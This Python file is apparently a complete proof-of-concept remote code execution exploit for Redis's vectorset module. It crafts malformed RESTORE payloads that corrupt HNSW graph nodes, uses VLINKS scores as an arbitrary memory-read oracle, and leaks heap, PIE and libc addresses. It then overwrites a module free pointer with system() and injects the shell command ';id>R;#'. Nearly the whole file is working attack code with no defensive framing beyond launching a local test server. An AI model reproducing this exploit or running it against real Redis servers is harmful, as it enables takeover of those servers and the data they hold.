from __future__ import annotations

import argparse
import os
import pathlib
import re
import shutil
import socket
import struct
import subprocess
import time
from dataclasses import dataclass

RDB_TYPE_MODULE_2 = 7
RDB_VERSION = 14
RDB_MODULE_OPCODE_EOF = 0
RDB_MODULE_OPCODE_UINT = 2
RDB_MODULE_OPCODE_STRING = 5
LUA_TO_OLD_B = 0x1D40
LUA_TO_C0 = 0x2030
MODULETYPE_FREE_OFF = 72
SERVER_DB_OFF = 64
KVSTORE_DICTS_OFF = 152
KVSTORE_NUM_DICTS_OFF = 160
DICT_TABLE0_OFF = 8
DICT_USED0_OFF = 24
DICT_HT_SIZE_EXP0_OFF = 52
KVOBJ_PTR_OFF = 8
KVOBJ_EMBED_HDR_OFF = 16


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & ((1 << 64) - 1))


def rdb_len(n: int) -> bytes:
    if n < 1 << 6:
        return bytes([n])
    if n < 1 << 14:
        return bytes([0x40 | (n >> 8), n & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\x80" + struct.pack(">I", n)
    return b"\x81" + struct.pack(">Q", n)


def mod_uint(n: int) -> bytes:
    return rdb_len(RDB_MODULE_OPCODE_UINT) + rdb_len(n)


def mod_str(b: bytes) -> bytes:
    return rdb_len(RDB_MODULE_OPCODE_STRING) + rdb_len(len(b)) + b


def module_type_id(name: str, encver: int = 0) -> int:
    cset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    out = 0
    for ch in name:
        out = (out << 6) | cset.index(ch)
    return (out << 10) | encver


MODULE_ID = module_type_id("vectorset")


def fbits(f: float) -> int:
    return struct.unpack("<I", struct.pack("<f", f))[0]


def hnode_qbin(name: bytes, vec: bytes, node_id: int, links: list[int], max_links: int | None = None) -> bytes:
    if max_links is None:
        max_links = max(32, len(links))
    params = [node_id, (1 << 24) | 0, len(links), max_links, *links]
    params += [((fbits(1.0) << 32) | 0) if links else 0, fbits(1.0)]
    out = mod_str(name) + mod_str(vec) + mod_uint(len(params))
    for q in params:
        out += mod_uint(q)
    return out


def restore_payload_65_masks() -> bytes:
    masks = [0] + [1 << i for i in range(64)]
    cids = [2 + i for i in range(len(masks))]
    body = bytes([RDB_TYPE_MODULE_2]) + rdb_len(MODULE_ID)
    body += mod_uint(64)
    body += mod_uint(2 + len(masks))
    body += mod_uint((16 << 8) | 2)
    body += mod_uint(0)
    body += hnode_qbin(b"A", (1).to_bytes(8, "little"), 1, cids, max_links=max(32, len(cids)))
    body += hnode_qbin(b"B", (2).to_bytes(8, "little"), 1, [])
    for i, m in enumerate(masks):
        body += hnode_qbin(f"C{i:02d}".encode(), m.to_bytes(8, "little"), 2 + i, [1])
    body += rdb_len(RDB_MODULE_OPCODE_EOF) + RDB_VERSION.to_bytes(2, "little") + b"\0" * 8
    return body


def hnode_f32(name: bytes, vector: tuple[float, float], node_id: int, layers: list[list[int]]) -> bytes:
    vector_bytes = struct.pack("<ff", *vector)
    level = len(layers) - 1
    params = [node_id, (1 << 24) | level]
    for lev, links in enumerate(layers):
        params += [len(links), 32 if lev == 0 else 16, *links]
        params.append(((fbits(1.0) << 32) | 0) if links else 0)
    params.append(fbits(1.0))
    out = mod_str(name) + mod_str(vector_bytes) + mod_uint(len(params))
    for q in params:
        out += mod_uint(q)
    return out


def payload_two_stale_for_write() -> bytes:
    body = bytes([RDB_TYPE_MODULE_2]) + rdb_len(MODULE_ID)
    body += mod_uint(2) + mod_uint(6) + mod_uint(16 << 8) + mod_uint(0)
    body += hnode_f32(b"A", (1, 0), 1, [[2]])
    body += hnode_f32(b"B", (0, 1), 1, [[]])
    body += hnode_f32(b"F", (0, -1), 3, [[2]])
    body += hnode_f32(b"D", (1, 1), 3, [[]])
    body += hnode_f32(b"C", (-1, 0), 2, [[1, 3]])
    body += hnode_f32(b"E", (-1, -1), 4, [[], []])
    body += rdb_len(RDB_MODULE_OPCODE_EOF) + RDB_VERSION.to_bytes(2, "little") + b"\0" * 8
    return body


def make_req(*args) -> bytes:
    out = b"*" + str(len(args)).encode() + b"\r\n"
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        elif isinstance(a, int):
            a = str(a).encode()
        out += b"$" + str(len(a)).encode() + b"\r\n" + a + b"\r\n"
    return out


def redis_cmd(port: int, *args, timeout: float = 1.0) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(make_req(*args))
        chunks = []
        while True:
            try:
                part = s.recv(65536)
            except TimeoutError:
                break
            if not part:
                break
            chunks.append(part)
            if len(part) < 65536:
                break
        return b"".join(chunks)


def resp_bulk(resp: bytes) -> bytes:
    if not resp.startswith(b"$"):
        raise RuntimeError(f"expected bulk reply, got {resp[:120]!r}")
    e = resp.index(b"\r\n")
    n = int(resp[1:e])
    if n < 0:
        raise RuntimeError("nil bulk")
    return resp[e + 2:e + 2 + n]


class RespParser:
    def __init__(self, sock: socket.socket):
        self.s = sock
        self.buf = b""

    def need(self, n: int) -> None:
        while len(self.buf) < n:
            chunk = self.s.recv(65536)
            if not chunk:
                raise EOFError("socket closed")
            self.buf += chunk

    def line(self) -> bytes:
        while b"\r\n" not in self.buf:
            chunk = self.s.recv(65536)
            if not chunk:
                raise EOFError("socket closed")
            self.buf += chunk
        i = self.buf.index(b"\r\n")
        line = self.buf[:i]
        self.buf = self.buf[i + 2:]
        return line

    def parse(self):
        self.need(1)
        p = self.buf[:1]
        self.buf = self.buf[1:]
        line = self.line()
        if p in b"+-:,":
            return p, line
        if p == b"$":
            n = int(line)
            if n < 0:
                return None
            self.need(n + 2)
            data = self.buf[:n]
            self.buf = self.buf[n + 2:]
            return data
        if p in b"*%~":
            n = int(line)
            total = n * (2 if p == b"%" else 1)
            return [self.parse() for _ in range(total)]
        raise ValueError((p, line, self.buf[:32]))


def collect_floats(obj) -> list[float]:
    out = []
    if isinstance(obj, bytes):
        if re.fullmatch(rb"[+-]?(?:\d+(?:\.\d*)?|\.\d+)", obj):
            out.append(float(obj))
    elif isinstance(obj, tuple):
        p, line = obj
        if p == b",":
            try:
                out.append(float(line))
            except ValueError:
                pass
    elif isinstance(obj, list):
        for x in obj:
            out.extend(collect_floats(x))
    return out


class FastReader:
    def __init__(self, port: int):
        self.s = socket.create_connection(("127.0.0.1", port), timeout=2)
        self.s.settimeout(2)
        self.r = RespParser(self.s)

    def cmd(self, *args):
        self.s.sendall(make_req(*args))
        return self.r.parse()

    def read64(self, addr: int) -> int:
        self.cmd("SETRANGE", "spray", "11", p64(addr))
        self.s.sendall(b"".join(make_req("VLINKS", "v", f"C{i:02d}", "WITHSCORES") for i in range(65)))
        vals = []
        for i in range(65):
            obj = self.r.parse()
            fs = collect_floats(obj)
            if not fs:
                raise RuntimeError(f"no score for C{i:02d}: {obj!r}")
            vals.append(fs[-1])
        pc0 = round((1.0 - vals[0]) * 64)
        out = 0
        for bit in range(64):
            if round((1.0 - vals[bit + 1]) * 64) < pc0:
                out |= 1 << bit
        return out

    def read8(self, addr: int) -> int:
        return self.read64(addr) & 0xFF

    def read_bytes(self, addr: int, n: int) -> bytes:
        data = bytearray()
        for off in range(0, n, 8):
            data += p64(self.read64(addr + off))
        return bytes(data[:n])

    def close(self) -> None:
        self.s.close()


@dataclass
class KeyEntry:
    name: bytes
    kv: int
    value: int
    keyptr: int


def parse_symbol_offset(binary: pathlib.Path, symbol: str) -> int:
    out = subprocess.check_output(["nm", "-an", str(binary)], text=True)
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] == symbol:
            return int(parts[0], 16)
    raise RuntimeError(f"could not find symbol {symbol}")


def parse_got_offset(binary: pathlib.Path, symbol: str) -> int:
    out = subprocess.check_output(["readelf", "-rW", str(binary)], text=True)
    for line in out.splitlines():
        if re.search(rf"\b{re.escape(symbol)}@", line):
            return int(line.split()[0], 16)
    raise RuntimeError(f"could not find GOT relocation for {symbol}")


def libc_path(binary: pathlib.Path) -> str:
    out = subprocess.check_output(["ldd", str(binary)], text=True)
    for line in out.splitlines():
        if "libc.so.6" in line:
            m = re.search(r"=>\s+(\S+)", line)
            if m:
                return m.group(1)
            first = line.strip().split()[0]
            if first.startswith("/"):
                return first
    return "/lib/x86_64-linux-gnu/libc.so.6"


def map_base(pid: int, target: pathlib.Path) -> int:
    target_s = str(target)
    for line in pathlib.Path(f"/proc/{pid}/maps").read_text().splitlines():
        if target_s in line and "r--p" in line:
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError("could not locate redis-server mapping")


def libc_offsets(binary: pathlib.Path) -> tuple[int, int]:
    out = subprocess.check_output(["readelf", "-sW", libc_path(binary)], text=True)
    got = {}
    for line in out.splitlines():
        m = re.search(r"\s+([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+(free|system)@@", line)
        if m:
            got[m.group(2)] = int(m.group(1), 16)
    if "free" not in got or "system" not in got:
        raise RuntimeError("could not parse libc free/system offsets")
    return got["free"], got["system"]


def start_redis(binary: pathlib.Path, work: pathlib.Path, port: int) -> subprocess.Popen:
    tmp = work / "tmp"
    rundir = tmp / f"rce-nondebug-{port}-{os.getpid()}"
    shutil.rmtree(rundir, ignore_errors=True)
    rundir.mkdir(parents=True, exist_ok=True)
    conf = tmp / f"rce-nondebug-{port}.conf"
    conf.write_text(
        f"port {port}\n"
        "bind 127.0.0.1\n"
        "protected-mode no\n"
        "save \"\"\n"
        "appendonly no\n"
        f"dir {work}\n"
        f"dbfilename rce-nondebug-{port}.rdb\n"
        f"logfile {tmp / f'rce-nondebug-{port}.log'}\n"
        "daemonize no\n"
        "enable-debug-command no\n"
        "sanitize-dump-payload yes\n"
    )
    p = subprocess.Popen([str(binary), str(conf)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(150):
        try:
            if b"PONG" in redis_cmd(port, "PING", timeout=0.2):
                return p
        except Exception:
            time.sleep(0.02)
    raise RuntimeError("Redis did not start")


def runtime_dir(work: pathlib.Path, port: int) -> tuple[pathlib.Path, pathlib.Path | None]:
    if len(work.as_posix()) <= 36:
        return work, None
    roots = []
    if pathlib.Path("/mnt/d").exists():
        roots.append(pathlib.Path("/mnt/d"))
    roots.append(pathlib.Path("/tmp"))
    names = ["rv"] + [f"rv{i}" for i in range(10)] + ["rw", "rx", "ry", "rz"]
    for root in roots:
        for name in names:
            cand = root / name
            if cand.exists() or cand.is_symlink():
                continue
            try:
                cand.mkdir()
                return cand, cand
            except OSError:
                continue
    return work, None


def fake_hnsw_for_read(old_b: int, target: int, length: int = 330) -> bytes:
    d = bytearray(b"Z" * length)

    def put(struct_off: int, bs: bytes) -> None:
        off = struct_off - 5
        d[off:off + len(bs)] = bs

    put(16, p64(target))
    put(288, p64(old_b + 296))
    put(296, p64(old_b + 312) + p64(0))
    put(312, p64(0x10) + p64(1337))
    return bytes(d)


def setrange(port: int, key: str | bytes, off: int, data: bytes) -> None:
    r = redis_cmd(port, "SETRANGE", key, str(off), data, timeout=2)
    if not r.startswith(b":"):
        raise RuntimeError(f"SETRANGE {key!r}@{off} failed: {r!r}")


def key_name_from_kv(fr: FastReader, kv: int) -> tuple[bytes, int]:
    hdr = fr.read8(kv + KVOBJ_EMBED_HDR_OFF)
    keyptr = kv + KVOBJ_EMBED_HDR_OFF + 1 + hdr
    raw = fr.read_bytes(keyptr, 32)
    return raw.split(b"\0", 1)[0], keyptr


def scan_db_keys(fr: FastReader, binary: pathlib.Path, pie: int, max_entries: int = 128) -> list[KeyEntry]:
    server = pie + parse_symbol_offset(binary, "server")
    db = fr.read64(server + SERVER_DB_OFF)
    kvs = fr.read64(db)
    dicts = fr.read64(kvs + KVSTORE_DICTS_OFF)
    num_dicts = fr.read64(kvs + KVSTORE_NUM_DICTS_OFF)
    if num_dicts == 0 or num_dicts > 64:
        raise RuntimeError(f"unexpected kvstore num_dicts={num_dicts} at {kvs:#x}")
    out = []
    seen = set()
    for di in range(num_dicts):
        d = fr.read64(dicts + 8 * di)
        if d == 0:
            continue
        table = fr.read64(d + DICT_TABLE0_OFF)
        used = fr.read64(d + DICT_USED0_OFF)
        exp = fr.read8(d + DICT_HT_SIZE_EXP0_OFF)
        if used == 0 or exp > 20:
            continue
        for bi in range(1 << exp):
            cur = fr.read64(table + 8 * bi)
            depth = 0
            while cur and depth < 32 and len(out) < max_entries:
                if cur & 1:
                    kv = cur
                    nxt = 0
                elif cur & 2:
                    kv = cur & ~7
                    nxt = 0
                else:
                    nxt = fr.read64(cur)
                    kv = fr.read64(cur + 8)
                if kv and kv not in seen:
                    try:
                        name, keyptr = key_name_from_kv(fr, kv)
                        value = fr.read64(kv + KVOBJ_PTR_OFF)
                        out.append(KeyEntry(name=name, kv=kv, value=value, keyptr=keyptr))
                        seen.add(kv)
                    except Exception:
                        pass
                cur = nxt
                depth += 1
    return out


def find_required_keys(fr: FastReader, binary: pathlib.Path, pie: int, required: set[bytes]) -> dict[bytes, KeyEntry]:
    entries = []
    got = {}
    for _ in range(5):
        entries = scan_db_keys(fr, binary, pie)
        got = {e.name: e for e in entries if e.name in required}
        if required.issubset(got.keys()):
            return got
        time.sleep(0.05)
    names = sorted(e.name for e in entries)
    raise RuntimeError(f"missing keys {sorted(required - got.keys())}; saw {names}")


def patch_fake_node(port: int, key: str, content_ptr: int, links_target: int, system_addr: int | None, command: bytes | None) -> None:
    buf = bytearray(b"\0" * 330)
    if command is not None:
        buf[:len(command)] = command
    buf[16 - 5:16 - 5 + 8] = p64(content_ptr + 200)
    buf[200:208] = struct.pack("<ff", 0.0, 0.0)
    if system_addr is not None:
        buf[MODULETYPE_FREE_OFF - 5:MODULETYPE_FREE_OFF - 5 + 8] = p64(system_addr)
    layer = p64(links_target) + struct.pack("<II f I", 0, 1, 0.0, 0)
    buf[312 - 5:312 - 5 + len(layer)] = layer
    setrange(port, key, 0, bytes(buf))


def run(binary: pathlib.Path, work: pathlib.Path, port: int) -> int:
    proof = work / "R"
    try:
        proof.unlink()
    except FileNotFoundError:
        pass
    redis_work, cleanup_link = runtime_dir(work, port)
    if redis_work != work:
        (redis_work / "R").symlink_to(proof)
    p = start_redis(binary, redis_work, port)
    fr = None
    try:
        lua_s = resp_bulk(redis_cmd(port, "EVAL", "return tostring({})", "0", timeout=1)).decode()
        lua_ptr = int(lua_s.split("0x", 1)[1], 16)
        old_b = lua_ptr + LUA_TO_OLD_B
        c0 = lua_ptr + LUA_TO_C0
        print(f"[+] lua={lua_ptr:#x} oldB(read)={old_b:#x} C00={c0:#x}")
        print(f"[+] RESTORE v(read) {redis_cmd(port, 'RESTORE', 'v', '0', restore_payload_65_masks(), 'REPLACE', timeout=2)!r}")
        print(f"[+] VREM v B {redis_cmd(port, 'VREM', 'v', 'B', timeout=1)!r}")
        print(f"[+] SET spray {redis_cmd(port, 'SET', 'spray', fake_hnsw_for_read(old_b, c0 + 8), timeout=1)!r}")
        fr = FastReader(port)
        probe = fr.read64(c0 + 8)
        if probe != 2:
            raise RuntimeError(f"read oracle self-test failed: read C00.id {probe:#x}")
        pie = map_base(p.pid, binary)
        free_got_off = parse_got_offset(binary, "free")
        free_addr = fr.read64(pie + free_got_off)
        free_off, system_off = libc_offsets(binary)
        libc_base = free_addr - free_off
        system_addr = libc_base + system_off
        print(f"[+] pie={pie:#x} free@GOT={pie + free_got_off:#x}->{free_addr:#x}")
        print(f"[+] libc={libc_base:#x} system={system_addr:#x}")
        print(f"[+] RESTORE w(write) {redis_cmd(port, 'RESTORE', 'w', '0', payload_two_stale_for_write(), 'REPLACE', timeout=2)!r}")
        print(f"[+] VREM w B {redis_cmd(port, 'VREM', 'w', 'B', timeout=1)!r}")
        print(f"[+] VREM w D {redis_cmd(port, 'VREM', 'w', 'D', timeout=1)!r}")
        print(f"[+] SET fD {redis_cmd(port, 'SET', 'fD', b'D' * 330, timeout=1)!r}")
        print(f"[+] SET fB {redis_cmd(port, 'SET', 'fB', b'B' * 330, timeout=1)!r}")
        keys = find_required_keys(fr, binary, pie, {b"w", b"fD", b"fB", b"spray", b"v"})
        w_mv = keys[b"w"].value
        fD_content = keys[b"fD"].value
        fB_content = keys[b"fB"].value
        print(f"[+] w moduleValue={w_mv:#x}")
        print(f"[+] fD content/node={fD_content:#x}/{fD_content - 5:#x}")
        print(f"[+] fB content/node={fB_content:#x}/{fB_content - 5:#x}")
        cmd = b";id>R;#\0"
        patch_fake_node(port, "fD", fD_content, w_mv + 8, system_addr=system_addr, command=None)
        patch_fake_node(port, "fB", fB_content, w_mv, system_addr=None, command=cmd)
        print("[+] fake HNSW nodes patched")
        print(f"[+] VREM w C {redis_cmd(port, 'VREM', 'w', 'C', timeout=2)!r}")
        try:
            out = redis_cmd(port, "DEL", "w", timeout=4)
        except Exception as e:
            out = b"EXC " + repr(e).encode()
        print(f"[+] DEL w {out[:160]!r}")
        for _ in range(20):
            if proof.exists():
                print(f"[+] RCE proof created: {proof}")
                print(proof.read_text(errors="replace").strip())
                return 0
            time.sleep(0.1)
        print("[-] marker was not created")
        return 1
    finally:
        if fr is not None:
            fr.close()
        try:
            p.terminate()
            p.wait(timeout=2)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
        if cleanup_link is not None:
            shutil.rmtree(cleanup_link, ignore_errors=True)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--redis-server", required=True)
    ap.add_argument("--work-dir", default="/mnt/d/rv" if pathlib.Path("/mnt/d").exists() else "/tmp/redis-vset-rce")
    ap.add_argument("--port", type=int, default=6631)
    args = ap.parse_args()
    binary = pathlib.Path(args.redis_server).resolve()
    work = pathlib.Path(args.work_dir).resolve()
    work.mkdir(parents=True, exist_ok=True)
    return run(binary, work, args.port)


if __name__ == "__main__":
    raise SystemExit(main())
